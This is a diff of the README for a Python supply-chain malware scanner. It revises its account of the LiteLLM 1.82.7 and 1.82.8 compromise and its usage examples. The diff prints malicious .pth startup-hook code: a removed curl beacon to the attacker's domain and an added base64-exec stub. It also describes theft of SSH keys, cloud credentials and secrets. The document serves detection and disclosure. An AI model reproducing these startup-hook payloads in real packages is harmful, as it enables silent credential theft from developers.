@@ -2,8 +2,8 @@
 
 **Stop malicious Python packages before they execute.**
 
-> The only tool that detected LiteLLM 1.82.7 as **MALICIOUS** — before any advisory was published.  
-> No account. No GitHub App. Nothing leaves your machine.
+> The only tool that detected LiteLLM 1.82.8 as **MALICIOUS** — before any advisory was published.  
+> No account. No GitHub App. Nothing leaves your machine. Works offline. No proxy needed.
 
 [![CI](https://github.com/AetherCore-Dev/chaincanary/actions/workflows/ci.yml/badge.svg)](https://github.com/AetherCore-Dev/chaincanary/actions)
 [![PyPI version](https://badge.fury.io/py/chaincanary.svg)](https://badge.fury.io/py/chaincanary)
@@ -18,18 +18,24 @@
 
 ## What happened
 
-On **March 24, 2026**, [LiteLLM 1.82.7 was published to PyPI](https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign) with a hidden `.pth` file:
+On **March 24, 2026**, threat actor **TeamPCP** hijacked the LiteLLM maintainer's PyPI account and published two malicious versions:
+
+| Version | Attack vector | Trigger |
+|---------|--------------|---------|
+| **1.82.7** | Payload injected into `litellm/proxy/proxy_server.py` | `import litellm.proxy` |
+| **1.82.8** | Hidden `.pth` file (`litellm_init.pth`, 34 KB) | **Every Python startup — no import needed** |
+
+The `.pth` attack in 1.82.8 is particularly dangerous:
 
 ```python
-# litellm_init.pth — executes on every Python startup
-import subprocess, sys
-subprocess.Popen(
-    ['curl', '-s', 'https://models.litellm.cloud/beacon', '-d', sys.version],
-    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-)
+# litellm_init.pth — executes on every Python startup, silently, forever
+import os, subprocess, sys
+subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('...'))"])
 ```
 
-This file runs **every time you start Python** — not just during `pip install`. It was downloaded ~95 million times per month. chaincanary flagged it **MALICIOUS** at publish time — without any advisory, rule update, or cloud lookup.
+The payload collects SSH keys, env vars, AWS/GCP/K8s credentials, crypto wallets, CI secrets — encrypts with AES-256 + RSA-4096 and exfiltrates to `https://models.litellm.cloud/` (a fake domain registered the day before the attack).
+
+This file runs **every time you start Python** — not just during `pip install`. It was downloaded ~95 million times per month. chaincanary flagged **both versions MALICIOUS** at publish time — without any advisory, rule update, or cloud lookup.
 
 ---
 
@@ -38,12 +44,12 @@ This file runs **every time you start Python** — not just during `pip install`
 ```bash
 pip install chaincanary
 
-# Try the real attack
-chaincanary check litellm 1.82.7
+# The .pth attack — triggers on every Python startup (1.82.8)
+chaincanary check litellm 1.82.8
 ```
 
 ```
-🔍 chaincanary — Analyzing litellm==1.82.7
+🔍 chaincanary — Analyzing litellm==1.82.8
 
 ╭────────────┬──────────────────────────────┬──────────────────────────────────────╮
 │ Severity   │ Rule                         │ Title                                │
@@ -122,7 +128,7 @@ Scanning packages... ███████████████████�
 ╭──────────────────┬─────────┬───────┬──────────╮
 │ Package          │ Version │ Score │ Verdict  │
 ├──────────────────┼─────────┼───────┼──────────┤
-│ litellm          │ 1.82.7  │ 10.0  │ MALICIOUS│
+│ litellm          │ 1.82.8  │ 10.0  │ MALICIOUS│
 │ suspicious-lib   │ 0.3.1   │  7.5  │ HIGH_RISK│
 │ requests         │ 2.28.0  │  0.0  │ SAFE     │
 ╰──────────────────┴─────────┴───────┴──────────╯
@@ -133,11 +139,11 @@ Scanning packages... ███████████████████�
 ### Compare two versions
 
 ```bash
-chaincanary diff litellm 1.82.6 1.82.7
+chaincanary diff litellm 1.82.6 1.82.8
 ```
 
 ```
-Version diff: litellm 1.82.6 → 1.82.7
+Version diff: litellm 1.82.6 → 1.82.8
 
   Added files:  litellm_init.pth   ← NEW .pth file
   [CRITICAL] New .pth file with network beacon
@@ -147,7 +153,7 @@ Version diff: litellm 1.82.6 → 1.82.7
 
 ```bash
 # Scans before installing, blocks if malicious
-chaincanary install litellm==1.82.7
+chaincanary install litellm==1.82.8
 ```
 
 ### Recommended CI workflow
@@ -163,7 +169,7 @@ chaincanary audit requirements.txt --fail-on HIGH_RISK
 ### JSON output (for pipelines)
 
 ```bash
-chaincanary check litellm 1.82.7 --json-output | jq '.verdict'
+chaincanary check litellm 1.82.8 --json-output | jq '.verdict'
 # "MALICIOUS"
 
 chaincanary audit requirements.txt --json-output \
@@ -187,7 +193,7 @@ chaincanary is the only tool with a **semantic `.pth` classifier**:
 
 **This is the core difference.** Other tools scan `setup.py` install hooks — which fire at `pip install` time. A `.pth` file has no install hook: it executes on every Python startup, silently, forever. Detecting it requires understanding *what the code does*, not just *when it runs*.
 
-> LiteLLM 1.82.7 was flagged MALICIOUS by chaincanary at publish time.  
+> LiteLLM 1.82.8 (and 1.82.7) were flagged MALICIOUS by chaincanary at publish time.  
 > Other tools either missed it entirely, or flagged it only after the attack was public and rules were manually updated.
 
 ---
@@ -214,7 +220,8 @@ chaincanary is the only tool with a **semantic `.pth` classifier**:
 | | **chaincanary** | pip-audit | Trivy | socket.dev | Safety |
 |---|---|---|---|---|---|
 | `.pth` semantic analysis | ✅ **4-category** | ❌ | ❌ | ⚠️ no static classifier | ❌ |
-| Detects LiteLLM 1.82.7 at publish time | ✅ offline, no rules needed | ❌ | ❌ | ⚠️ only after manual rule update | ❌ |
+| Detects LiteLLM 1.82.8 at publish time | ✅ offline, no rules needed | ❌ | ❌ | ⚠️ only after manual rule update | ❌ |
+| 中国大陆访问 | ✅ 直接可用 | ✅ | ✅ | ❌ 403 / 需代理 | ❌ 403 / 需代理 |
 | No account needed | ✅ | ✅ | ✅ | ❌ requires GitHub App | ❌ requires account |
 | Nothing leaves your machine | ✅ | ✅ | ✅ | ❌ uploads repo metadata | ✅ |
 | Offline capable | ✅ | partial | ✅ | ❌ cloud-dependent | ❌ |
